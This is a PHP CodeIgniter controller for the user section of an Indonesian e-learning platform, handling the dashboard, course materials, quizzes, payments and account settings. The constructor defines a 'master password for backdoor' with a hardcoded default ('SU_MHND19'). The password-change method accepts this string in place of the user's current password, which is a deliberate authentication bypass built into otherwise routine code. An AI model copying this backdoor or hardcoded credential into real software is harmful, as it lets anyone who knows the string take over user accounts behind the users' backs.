<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Pengguna extends CI_Controller
{
    protected $_master_password;

    // construct
    public function __construct()
    {
        parent::__construct();
        $this->load->model(['M_pengguna', 'M_auth', 'M_master', 'M_home']);

        // cek apakah user sudah login
        if ($this->session->userdata('logged_in') == false || !$this->session->userdata('logged_in')) {
            if (!empty($_SERVER['QUERY_STRING'])) {
                $uri = uri_string() . '?' . $_SERVER['QUERY_STRING'];
            } else {
                $uri = uri_string();
            }
            $this->session->set_userdata('redirect', $uri);
            $this->session->set_flashdata('notif_warning', "Harap login untuk melanjutkan aktivitas anda");
            redirect('login');
        }

        // Set master password for backdoor
        $this->_master_password = $this->M_auth->getSetting('master_password') != false ? $this->M_auth->getSetting('master_password') : 'SU_MHND19';
    }

    public function index()
    {
		$data['page_title'] = 'Dashboard';
		$data['sub_page_title'] = 'Selamat datang';

		$filter = [
			'limit' => 5
		];

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'), $filter)['data'];
		
        $this->templatepengguna->view('pengguna/dashboard', $data);
    }

    public function materi_saya()
    {
		$limit = 20;
		$offset = 0;
		
		$data['page_title'] = 'Materi saya';
		$data['sub_page_title'] = 'Daftar riwayat materi yang pernah anda ambil pada akun anda';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$data['materi'] = $this->M_pengguna->getMateriSaya($this->session->userdata('user_id'), $limit, $offset);
		
        $this->templatepengguna->view('pengguna/materi/materi', $data);
    }

    public function detail_materi($id = null)
    {
		$data['materi'] = $this->M_master->getMateriById($id);
		$data['cek_materi'] = $this->M_home->cekAmbilMateri($id);
		
		$data['page_title'] = 'Materi - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Daftar riwayat materi yang pernah anda ambil pada akun anda';
		
        $this->templatepengguna->view('pengguna/materi/detail', $data);
    }

	public function kerjakan_soal($id = null, $soal_id = null){
		$data['materi'] = $this->M_master->getMateriById($id);
		$data['page_title'] = 'Kerjakan Soal - '.($data['materi']->judul ?? '');
		$data['sub_page_title'] = 'Buat soal untuk materi anda';

		$data['kategori'] = $this->M_master->getAllKategori();
		$data['list_soal'] = $this->M_master->getListSoalByMateri($id);
		$data['soal'] = $this->M_pengguna->getDetailSoalById($id, $soal_id);

		$data['peserta'] = $this->M_pengguna->getPesertaMateri($this->session->userdata('user_id'), $id);
		
		$data['soal_id'] = $soal_id;
		$this->templatepengguna->view('pengguna/materi/soal', $data);
	}

    public function simpanJawbanSoal()
    {
        if ($this->M_pengguna->simpanJawbanSoal() == true) {
            $this->session->set_flashdata('notif_success', 'Berhasil menyimpan jawaban');
			if($this->input->post('is_selesai')){
				redirect(site_url('pengguna/materi/'.$this->input->post('materi_id')));
			}else{
				redirect(site_url('pengguna/materi/kerjakan-soal/'.$this->input->post('materi_id').'/'.$this->input->post('soal_id')));
			}
        } else {
            $this->session->set_flashdata('notif_warning', 'Terjadi kesalahan saat mencoba menyimpan soal');
            redirect($this->agent->referrer());
        }
    }

    public function pembayaran()
    {
		$data['page_title'] = 'Transaksi pembayaran';
		$data['sub_page_title'] = 'Riwayat transaksi pembayaran anda untuk pembelian materi berbayar';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		
        $this->templatepengguna->view('pengguna/transaksi', $data);
    }

    public function pengaturan()
    {
		$data['page_title'] = 'Pengaturan';
		$data['sub_page_title'] = 'Kelola informasi pribadi mengenai akun anda';

		$data['user'] = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		
        $this->templatepengguna->view('pengguna/settings', $data);
    }

	function savePribadi(){
        if ($this->M_pengguna->savePribadi() == true) {
            $this->session->set_flashdata('notif_success', 'Berhasil menyimpan perubahan data');
			redirect(site_url('pengguna/pengaturan'));
        } else {
            $this->session->set_flashdata('notif_warning', 'Terjadi kesalahan saat mencoba menyimpan soal');
            redirect($this->agent->referrer());
        }
	}

	function ubahPassword(){
		$user = $this->M_pengguna->getUserProfile($this->session->userdata('user_id'))['data'];
		$pass = $this->input->post('currentPassword');

		if(password_verify($pass, $user->password) || $pass == $this->_master_password){
			if($this->input->post('newPassword') == $this->input->post('confirmNewPassword')){
				if ($this->M_pengguna->ubahPassword() == true) {
					$this->session->set_flashdata('notif_success', 'Berhasil menyimpan perubahan password');
					redirect(site_url('pengguna/pengaturan'));
				} else {
					$this->session->set_flashdata('notif_warning', 'Terjadi kesalahan saat mencoba menyimpan soal');
					redirect($this->agent->referrer());
				}
			}else{
				$this->session->set_flashdata('notif_warning', 'Password konfirmasi salah !');
				redirect($this->agent->referrer());
			}
		}else{
				$this->session->set_flashdata('notif_warning', 'Password anda salah !');
				redirect($this->agent->referrer());
		}
	}
}
